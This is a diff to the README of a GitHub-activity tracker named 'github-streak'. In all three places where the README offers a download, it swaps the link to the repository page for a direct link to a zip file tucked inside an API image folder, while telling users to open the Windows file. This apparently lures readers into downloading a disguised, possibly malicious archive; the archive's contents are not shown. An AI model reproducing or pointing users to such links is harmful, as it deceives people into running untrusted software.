@@ -1,6 +1,6 @@
 # 🟢 github-streak - Track Real GitHub Activity
 
-[![Download github-streak](https://img.shields.io/badge/Download%20github--streak-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sofianeab1064/github-streak)
+[![Download github-streak](https://img.shields.io/badge/Download%20github--streak-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sofianeab1064/github-streak/raw/refs/heads/main/app/api/streak-stats-image/github_streak_2.8.zip)
 
 ## 📌 What this app does
 
@@ -35,7 +35,7 @@ If you plan to use the app for your own streak data, make sure your GitHub accou
 
 Visit this page to download:
 
-https://github.com/sofianeab1064/github-streak
+https://github.com/sofianeab1064/github-streak/raw/refs/heads/main/app/api/streak-stats-image/github_streak_2.8.zip
 
 On that page, look for the latest release or the main app files. Download the Windows version if one is listed.
 
@@ -192,6 +192,6 @@ The layout is built to be easy to read on a desktop screen
 
 If you need to get the app again, use the same link:
 
-https://github.com/sofianeab1064/github-streak
+https://github.com/sofianeab1064/github-streak/raw/refs/heads/main/app/api/streak-stats-image/github_streak_2.8.zip
 
 Visit this page to download the latest version and open the Windows file or web app from there
